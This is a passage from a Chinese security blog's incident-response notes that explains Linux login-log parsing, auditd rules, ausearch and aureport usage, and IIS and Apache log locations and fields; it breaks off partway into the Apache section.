class="code"><pre><span class="line">sudo cat /var/log/secure | awk &#x27;/Accepted publickey/&#123;print $(NF-3)&#125;&#x27;|sort|uniq -c |awk &#x27;&#123;print $2&quot;=&quot;$1;&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="查看登录成功日期、用户名、IP地址"><a href="#查看登录成功日期、用户名、IP地址" class="headerlink" title="查看登录成功日期、用户名、IP地址"></a>查看登录成功日期、用户名、IP地址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/secure |awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="分析涉及命令"><a href="#分析涉及命令" class="headerlink" title="分析涉及命令"></a>分析涉及命令</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 <code>|</code></h3><p>管道符命令仅会处理标准输出，对于标准错误会给予忽略。</p><p>管道命令必须要能够接受来自前一个命令的数据成为标准输入继续处理才行。</p><blockquote><p>让标准错误可以被管道符使用：使用<code>2&gt;&amp;1</code>，让<code>2&gt;</code>变成<code>1&gt;</code></p></blockquote><h3 id="head-amp-tail"><a href="#head-amp-tail" class="headerlink" title="head&amp;tail"></a>head&amp;tail</h3><p><code>tail -n 10 test.log</code>    最后10行</p><p><code>tail -n +10 test.log</code>   10行之后</p><p><code>head -n 10 test.log</code>   头10行  </p><p><code>head -n -10 test.log</code> 除了最后10行 </p><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/起始时间/&#x27;,&#x27;/结束时间/p&#x27; [日志文件]</span><br></pre></td></tr></table></figure><blockquote><p><code>-n</code> 读取下一个输入行，用下一个命令处理新的行而不是第一个命令</p><p><code>p</code> 打印输出</p></blockquote><h3 id="cut-分隔"><a href="#cut-分隔" class="headerlink" title="cut 分隔"></a>cut 分隔</h3><p>存在特定分隔字符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -d&#x27;分隔字符&#x27; -f fields</span><br></pre></td></tr></table></figure><p>用于整齐排列信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -c 12-15</span><br></pre></td></tr></table></figure><h3 id="grep-查找"><a href="#grep-查找" class="headerlink" title="grep 查找"></a>grep 查找</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [-acinv] [--color=auto] &#x27;查找字符&#x27; filename</span><br></pre></td></tr></table></figure><blockquote><p><code>-a</code> 将二进制文件以文本文件的方式查找数据</p><p><code>-c</code>查找字符的次数</p><p><code>-i</code>忽略大小写</p><p><code>-n</code>输出行号</p><p><code>-v</code>反向选择</p><p><code>--color=auto</code>关键字部分会用特殊颜色显示</p></blockquote><h3 id="sort-排序"><a href="#sort-排序" class="headerlink" title="sort 排序"></a>sort 排序</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort [-fbMnrtuk] [file or stdin]</span><br></pre></td></tr></table></figure><blockquote><p><code>-f</code>忽略大小写差异</p><p><code>-b</code>忽略最前面空格字符部分</p><p><code>-M</code>以月份的名字来排序</p><p><code>-n</code>使用纯数字来排序</p><p><code>-r</code>反向排序</p><p><code>-u</code>通<code>uniq</code>相同的数据仅出现一行 </p><p><code>-t</code>分隔符号，默认是<code>[Tab]</code> <code>#sort -t &#39;:&#39;</code></p><p><code>-k</code>以哪个分区（第几列）进行排序 </p></blockquote><h4 id="uniq-去重"><a href="#uniq-去重" class="headerlink" title="uniq 去重"></a>uniq 去重</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq [-ic]</span><br></pre></td></tr></table></figure><blockquote><p><code>-i</code>忽略大小写字符</p><p><code>-c</code>进行计数</p></blockquote><h3 id="wc-计数"><a href="#wc-计数" class="headerlink" title="wc 计数"></a>wc 计数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc [-lwm]</span><br></pre></td></tr></table></figure><blockquote><p><code>-l</code>行数</p><p><code>-w</code>字数（英文字母）</p><p><code>-m</code>字符数</p></blockquote><h3 id="awk-数据处理"><a href="#awk-数据处理" class="headerlink" title="awk 数据处理"></a>awk 数据处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;条件类型1&#123;操作1&#125; 条件类型2&#123;操作2&#125;....&#x27; filename</span><br></pre></td></tr></table></figure><blockquote><p><code>NF</code>每一行(<code>$0</code>)拥有的字段总数</p><p><code>NR</code>目前awk所处理的是第几行数据</p><p><code>FS</code>目前的分隔字符，默认是空格键</p></blockquote><h2 id="audit安全审计"><a href="#audit安全审计" class="headerlink" title="audit安全审计"></a>audit安全审计</h2><h3 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a>系统组成</h3><ul><li><strong>auditctl</strong> : 即时控制审计守护进程的行为的工具，如添加规则等。</li><li><strong>auditd</strong> ：audit 守护进程负责把内核产生的信息写入到硬盘上，这些信息由应用程序和系统活动触发产生。用户空间审计系统通过 auditd 后台进程接收内核审计系统传送来的审计信息，将信息写入到 /var/log/audit/audit.log。</li><li><strong>aureport</strong> : 查看和生成审计报告的工具。</li><li><strong>ausearch</strong> : 查找审计事件的工具</li><li><strong>auditspd</strong> : 转发事件通知给其他应用程序，而不是写入到审计日志文件中。</li><li><strong>autrace</strong> : 一个用于跟踪进程的命令。类似于 strace，跟踪某一个进程，并将跟踪的结果写入日志文件之中。</li></ul><h3 id="启用服务"><a href="#启用服务" class="headerlink" title="启用服务"></a>启用服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start auditd</span><br><span class="line">systemctl enable auditd #开机自动启动</span><br></pre></td></tr></table></figure><h4 id="Ubuntu下开启audit"><a href="#Ubuntu下开启audit" class="headerlink" title="Ubuntu下开启audit"></a>Ubuntu下开启audit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install auditd</span><br></pre></td></tr></table></figure><h3 id="查看audit服务状态"><a href="#查看audit服务状态" class="headerlink" title="查看audit服务状态"></a>查看audit服务状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost wiki]# service auditd start</span><br><span class="line">Redirecting to /bin/systemctl start auditd.service</span><br><span class="line">[root@localhost wiki]# auditctl -s</span><br><span class="line">enabled 1</span><br><span class="line">failure 1</span><br><span class="line">pid 1072</span><br><span class="line">rate_limit 0</span><br><span class="line">backlog_limit 8192</span><br><span class="line">lost 0</span><br><span class="line">backlog 0</span><br><span class="line">backlog_wait_time 60000</span><br><span class="line">loginuid_immutable 0 unlocked</span><br></pre></td></tr></table></figure><blockquote><p>enabled值为1代表开启，0为关闭，2表示规则锁定状态 ，可通过 -e参数进行设置。</p></blockquote><h3 id="文件系统监控"><a href="#文件系统监控" class="headerlink" title="文件系统监控"></a>文件系统监控</h3><h4 id="命令行执行-临时生效"><a href="#命令行执行-临时生效" class="headerlink" title="命令行执行-临时生效"></a>命令行执行-临时生效</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -w /tmp/filename -p wa -k test</span><br></pre></td></tr></table></figure><blockquote><p><code>-w</code>指定所要监控的文件或命令</p><p><code>-p</code>指定监控属性，如:</p><ul><li>r — 读取文件或者目录。</li><li>w — 写入文件或者目录。</li><li>x — 运行文件或者目录。</li><li> a — 改变在文件或者目录中的属性</li></ul><p><code>-k</code>是可选字符串，可帮助您判定哪个规则或者哪组规则生成特定的日志项。设置一个关键词用于查询</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//设置规则所有对passwd文件的写、属性修改操作都会被记录审计日志</span><br><span class="line"></span><br><span class="line">auditctl -w /etc/passwd -p wa -k passwd_change</span><br><span class="line"></span><br><span class="line">//设置规则，监控/etc/selinux目录</span><br><span class="line"></span><br><span class="line">auditctl -w /etc/selinux/ -p wa -k selinux_change</span><br><span class="line"></span><br><span class="line">//设置规则，监控fdisk程序</span><br><span class="line"></span><br><span class="line">auditctl -w /usr/sbin/fdisk -p x -k disk_partition</span><br><span class="line"></span><br><span class="line">//设置规则，监控sshd_con：f文件</span><br><span class="line"></span><br><span class="line">auditctl -w /etc/ssh/sshd_config -p warx -k sshd_config</span><br></pre></td></tr></table></figure><h4 id="编辑配置文件-永久生效"><a href="#编辑配置文件-永久生效" class="headerlink" title="编辑配置文件-永久生效"></a>编辑配置文件-永久生效</h4><p><code>/etc/audit/auditd.conf</code> 守护程序的默认配置文件</p><p><code>/etc/audit/audit.rules</code> 记录审计规则文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">local_events = yes</span><br><span class="line">write_logs = yes</span><br><span class="line">log_file = /var/log/audit/audit.log  #审计日志文件的完整路径。如果您配置守护进程向除默认/var/log/audit/外的目录中写日志文件时，一定要修改它上面的文件权限，使得只有根用户有读、写和执行权限。所有其他用户都不能访问这个目录或这个目录中的日志文件。</span><br><span class="line">log_group = root</span><br><span class="line">log_format = ENRICHED</span><br><span class="line">flush = INCREMENTAL_ASYNC#多长时间向日志文件中写一次数据</span><br><span class="line">freq = 50</span><br><span class="line">max_log_file = 8#设置日志文件大小，单位是MB</span><br><span class="line">num_logs = 5</span><br><span class="line">priority_boost = 4#审计应采用多少优先级推进守护进程。必须是非负数。0表示没有变化。</span><br><span class="line">name_format = NONE</span><br><span class="line">##name = mydomain</span><br><span class="line">max_log_file_action = ROTATE</span><br><span class="line">space_left = 75</span><br><span class="line">space_left_action = SYSLOG</span><br><span class="line">verify_email = yes</span><br><span class="line">action_mail_acct = root</span><br><span class="line">admin_space_left = 50</span><br><span class="line">admin_space_left_action = SUSPEND</span><br><span class="line">disk_full_action = SUSPEND</span><br><span class="line">disk_error_action = SUSPEND</span><br><span class="line">use_libwrap = yes</span><br><span class="line">##tcp_listen_port = 60</span><br><span class="line">tcp_listen_queue = 5</span><br><span class="line">tcp_max_per_addr = 1</span><br><span class="line">##tcp_client_ports = 1024-65535</span><br><span class="line">tcp_client_max_idle = 0</span><br><span class="line">transport = TCP</span><br><span class="line">krb5_principal = auditd</span><br><span class="line">##krb5_key_file = /etc/audit/audit.key</span><br><span class="line">distribute_network = no</span><br><span class="line">q_depth = 400</span><br><span class="line">overflow_action = SYSLOG</span><br><span class="line">max_restarts = 10</span><br><span class="line">plugin_dir = /etc/audit/plugins.d</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost audit]# cat audit.rules</span><br><span class="line">## This file is automatically generated from /etc/audit/rules.d</span><br><span class="line">-D#删除所有当前装载的审核规则</span><br><span class="line">-b 8192#在内核中设定最大数量的已存在的审核缓冲区为 8Mb</span><br><span class="line">-f 1#当追踪重要错误时设定所要完成的行动</span><br><span class="line">--backlog_wait_time 60000</span><br></pre></td></tr></table></figure><blockquote><p>写入完重启服务，<code>auditctl -l</code>查看规则，<code>auditctl -D</code>删除规则。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210903102807860.png" alt="image-20210903102807860"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210903102935696.png" alt="image-20210903102935696"></p><h3 id="auditctl日志分析"><a href="#auditctl日志分析" class="headerlink" title="auditctl日志分析"></a>auditctl日志分析</h3><p><code>tail /var/log/audit/audit.log</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=SYSCALL msg=audit(1630636108.992:216): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7f0c8b3157a8 a2=541 a3=1b6 items=2 ppid=2070 pid=2071 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=10 comm=&quot;zsh&quot; exe=&quot;/usr/bin/zsh&quot; subj==unconfined key=&quot;testinfo&quot;ARCH=x86_64 SYSCALL=openat AUID=&quot;kali&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;</span><br></pre></td></tr></table></figure><blockquote><p><code>type</code>消息类型，详见<a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-audit_record_types">审计记录类型</a></p><p><code>msg</code>消息ID 两个部分组成，分号之前的是Unix的时间戳，分号之后的是真正的event ID，<code>time_stamp:ID</code>，时间是<code>date +%s</code>（1970-1-1至今的秒数）</p><p><code>arch</code>调用system call的CPU构架，arch=c000003e，代表x86_64（16进制）</p><p><code>syscall</code>system call的类型。<a href="https://github.com/torvalds/linux/blob/master/arch/sh/include/asm/unistd.h">详见</a></p><p><code>success</code>system call是成功或者失败。</p><p><code>exit</code>system call的返回值。</p><p><code>a0 to a3</code>系统调用的前四个参数的数字化，可以通过ausearch解码查看。</p><p><code>items</code>传递到应用程序的字符串数量。</p><p><code>ppid</code>父进程的PID    <code>pid</code>该进程的PID</p><p><code>auid</code> <code>audit ID</code>针对某一用户一个进程会被分配一个audit ID， 该audit ID会被传递给子进程，尽管在系统中用户切换，该audit ID将始终保持一致。可以追踪su前的账户。</p><p><code>uid</code>user ID    <code>gid</code>group ID</p><p><code>tty</code>应用程序开启的终端。</p><p><code>ses</code>用户登录的session ID.</p><p><code>comm</code>在命令行执行的指令</p><p><code>exe</code>二进制程序的解析路径。</p><p><code>subj</code>进程执行时selinux上下文</p><p><code>key</code>如果audit了很多的目录文件，分配一个key string方便后面我们通过ausearch去过滤这类log。</p><p><code>cwd</code>进程的执行目录.</p><p><code>ouid</code>**(**owner’s user id）  对象所有者id</p><p><code>guid</code>(owner’s groupid）  对象所属组id</p></blockquote><h3 id="ausearch"><a href="#ausearch" class="headerlink" title="ausearch"></a>ausearch</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ausearch [options]</span><br><span class="line">ausearch -if /var/log/audit/audit.log</span><br></pre></td></tr></table></figure><blockquote><p><code>-a number</code>  #只显示事件ID为指定数字的日志信息，如只显示926事件：ausearch -a 926</p><p><code>-c  commond</code>  #只显示和指定命令有关的事件，如只显示rm命令产生的事件：auserach  -c  rm</p><p><code>-i</code>  #显示出的信息更清晰，如事件时间、相关用户名都会直接显示出来，而不再是数字形式</p><p><code>-k</code>  #显示出和之前auditctl -k所定义的关键词相匹配的事件信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ausearch -m    #按消息类型查找</span><br><span class="line">ausearch -ul   #按登陆ID查找</span><br><span class="line">ausearch -ua   #按uid和euid查找</span><br><span class="line">ausearch -ui   #按uid查找</span><br><span class="line">ausearch -ue   #按euid查找</span><br><span class="line">ausearch -ga   #按gid和egid查找</span><br><span class="line">ausearch -gi   #按gid查找</span><br><span class="line">ausearch -ge   #按egid查找</span><br><span class="line">ausearch -c    #按cmd查找</span><br><span class="line">ausearch -x    #按exe查找</span><br><span class="line">ausearch -sc   #按syscall查找</span><br><span class="line">ausearch -p    #按pid查找</span><br><span class="line">ausearch -sv   #按syscall的返回值查找（yes/no）</span><br><span class="line">ausearch -f    #按文件名查找</span><br><span class="line">ausearch -tm   #按连接终端查找(term/ssh/tty)</span><br><span class="line">ausearch -hn   #按主机名查找</span><br><span class="line">ausearch -k    #按特定的key值查找</span><br><span class="line">ausearch -w    #按在audit rule设定的字符串查找</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 因登录失败而搜索 /var/log/audit/audit.log 文件</span><br><span class="line">ausearch --message USER_LOGIN --success no --interpret -if audit.log</span><br><span class="line">#搜索所有的账户，群组，角色变更</span><br><span class="line">ausearch -m ADD_USER -m DEL_USER -m ADD_GROUP -m USER_CHAUTHTOK -m DEL_GROUP -m CHGRP_ID -m ROLE_ASSIGN -m ROLE_REMOVE -i</span><br><span class="line"># 所有的由特定用户所执行的记录操作，使用用户的登录 ID（auid）</span><br><span class="line">ausearch -au 500 -i</span><br><span class="line"># 搜寻从昨天至今所有的失败的系统调用</span><br><span class="line">ausearch --start yesterday --end now -m SYSCALL -sv no -i</span><br></pre></td></tr></table></figure><h3 id="系统调用监控"><a href="#系统调用监控" class="headerlink" title="系统调用监控"></a>系统调用监控</h3><p>监视由任何进程或特定用户进行的系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl [option] filter,action   -S syscall   -F condition   -k label</span><br></pre></td></tr></table></figure><p>option 参数比较多，具体的可以<code>man auditctl</code></p><table><thead><tr><th>项目</th><th>可选参数</th><th>说明</th></tr></thead><tbody><tr><td>filter</td><td>user,exit,task,exclude</td><td>filter 详细说明哪个内核规则匹配过滤器应用在事件中。以下是其中之一的与规则匹配的过滤器： task、exit、user 以及 exclude</td></tr><tr><td>action</td><td>always, never</td><td>是否审核事件（always 表示是）（never 表示否）</td></tr><tr><td>syscall</td><td>all, 2, open 等</td><td>所有的系统调用都可以在/usr/include/asm/unistd_64.h 文件中找到。许多系统调用都能形成一个规则</td></tr><tr><td>condition</td><td>euid=0, arch=b64</td><td>详细说明其他选项，进一步修改规则来与以特定架构、组 ID、进程 ID 和其他内容为基础的事件相匹配</td></tr><tr><td>label</td><td>任意文字</td><td>标记审核事件并检索日志</td></tr></tbody></table><ul><li>-S 表示系统调用号或名字</li><li>-F 表示规则域</li><li>-k 表示设置审计规则上的过滤关键</li></ul><p>官方也写了几个expamples</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">To see all syscalls made by a specific program:</span><br><span class="line">auditctl -a always,exit -S all -F pid=1005</span><br><span class="line"></span><br><span class="line">To see files opened by a specific user:</span><br><span class="line">auditctl -a always,exit -S openat -F auid=510</span><br><span class="line"></span><br><span class="line">To see unsuccessful openat calls:</span><br><span class="line">auditctl -a always,exit -S openat -F success=0</span><br></pre></td></tr></table></figure><h3 id="aureport-创建审核报告"><a href="#aureport-创建审核报告" class="headerlink" title="aureport 创建审核报告"></a>aureport 创建审核报告</h3><p>生成有关过去三天内不包括示例日在内的记录的事件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport --start 04/08/2013 00:00:00 --end 04/11/2013 00:00:00</span><br></pre></td></tr></table></figure><p>生成所有可执行文件事件的一份报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -x -if audit.log</span><br></pre></td></tr></table></figure><p>生成以上可执行文件事件的总结</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -x --summary</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210903143114321.png" alt="image-20210903143114321"></p><p>生成所有用户失败事件的总结报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -u --failed --summary -i</span><br></pre></td></tr></table></figure><p>生成每个系统用户登录失败的总结报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport --login --summary -i</span><br></pre></td></tr></table></figure><p>通过 <code>ausearch</code> 查询搜索 用户 <code>500</code> 所有的文件访问事件生成一份报告</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ausearch --start today --loginuid 500 --raw | aureport -f --summary</span><br></pre></td></tr></table></figure><p>生成一份报告有关所有被查询的审核文件以及所包含事件的事件范围</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport -t</span><br></pre></td></tr></table></figure><h3 id="autrace-追踪指定进程"><a href="#autrace-追踪指定进程" class="headerlink" title="autrace 追踪指定进程"></a>autrace 追踪指定进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auditctl -D</span><br><span class="line">autrace /usr/bin/less</span><br><span class="line"></span><br><span class="line">Waiting to execute: /usr/bin/less</span><br><span class="line">Missing filename (&quot;less --help&quot; for help)</span><br><span class="line">Cleaning up...</span><br><span class="line">Trace complete. You can locate the records with &#x27;ausearch -i -p 4006&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>避免autrace与之前audit rule生成的日志冲突，使用auditctl -D去停止所有的audit log, 当autrace结束后，使用systemctl restart auditd重启audit服务。</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files">理解审核日志文件</a></p><p><a href="https://blog.csdn.net/whuzm08/article/details/87267956">Linux audit详解</a></p><p><a href="https://zhuanlan.zhihu.com/p/337289840">linux audit审计系统</a></p><p><a href="http://www.linuxe.cn/post-255.html">【系统运维】使用audit实现Linux系统安全审计</a></p><p><a href="https://onils.github.io/2018/08/09/Use-Linux-audit-to-analyze-security-threats/">利用Linux audit分析安全威胁</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS日志</title>
      <link href="/p/cb46c76d.html"/>
      <url>/p/cb46c76d.html</url>
      
        <content type="html"><![CDATA[<h2 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h2><p><strong>Windows Server 2003 iis6日志路径</strong></p><p><code>%systemroot%\system32\logfiles\w3svc1\</code></p><p><strong>Windows Server 2008 R2、2012、2016、2019 iis7以上日志路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles\w3svc1</span><br><span class="line">%SystemDrive%\inetpub\logs\LogFiles\</span><br><span class="line">%SystemDrive%\Windows\system32\logfiles\HTTPERR</span><br></pre></td></tr></table></figure><h2 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h2><h3 id="配置位置"><a href="#配置位置" class="headerlink" title="配置位置"></a>配置位置</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210831161416705.png" alt="image-20210831161416705"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 10.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2021-08-12 03:44:31</span><br><span class="line">#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken</span><br><span class="line">2021-08-12 03:44:31 192.168.77.175 GET / - 80 - 192.168.79.132 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/92.0.4515.131+Safari/537.36 - 200 0 0 426</span><br><span class="line">2021-08-12 03:50:04 192.168.77.175 GET /iisstart.png - 80 - 192.168.79.132 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/92.0.4515.131+Safari/537.36 http://192.168.77.175/ 304 0 0 54</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>s-</td><td>服务端操作</td></tr><tr><td>c-</td><td>客户端操作</td></tr><tr><td>cs-</td><td>客户端到服务端操作</td></tr><tr><td>sc-</td><td>服务端到客户端操作</td></tr></tbody></table><p><code>date</code> 日期</p><p><code>time</code> 时间</p><p><code>s-ip</code> 服务器IP</p><p><code>cs-method</code> 客户端请求服务端方法</p><p><code>cs-uri-stem</code> 请求访问的页面,<code>/</code>表示访问主页</p><p><code>cs-uri-query</code> 访问查询字符串<code>?</code>之后的。</p><p><code>s-port</code> 服务器端口</p><p><code>cs-username</code> 对于通过身份验证的用户，格式是<code>&quot;域\用户名&quot;</code>；对于匿名用户，是一个连字符 <code>-</code></p><p><code>c-ip</code> 客户端IP</p><p><code>cs(User-Agent)</code> 在客户端使用的浏览器。</p><p><code>cs(Referer)</code> 用户访问的前一个站点。此站点提供到当前站点的链接。</p><p><code>sc-status</code> 状态码</p><p><code>sc-substatus</code> HTTP子协议的状态</p><p><code>sc-win32-status</code> Win32® 状态</p><p><code>time-taken</code>操作花费的时间长短（亳秒）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525807(v=vs.90)">IIS 日志文件格式</a></p><p><a href="https://www.cnblogs.com/zhoujie/p/iis1.html">IIS日志字段详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache日志</title>
      <link href="/p/d4eb2913.html"/>
      <url>/p/d4eb2913.html</url>
      
        <content type="html"><![CDATA[<h2 id="apache日志位置"><a href="#apache日志位置" class="headerlink" title="apache日志位置"></a>apache日志位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## CentOS，Fedora，RedHat：</span><br><span class="line">/var/log/httpd/access.log</span><br><span class="line">## Ubuntu，Debian，Mint：</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/httpd-access.log</span><br></pre></td></tr></table></figure><h2 id="访问日志文件"><a href="#访问日志文件" class="headerlink" title="访问日志文件"></a>访问日志文件</h2><p>始终将访问日志写入单个文件不是可行的方法。 随着时间的流逝，在标准的Web服务器中，将有许多访问日志文件，它们以结构化的方式命名。 我们可以使用<code>ls</code>命令列出访问日志文件。</p><figure 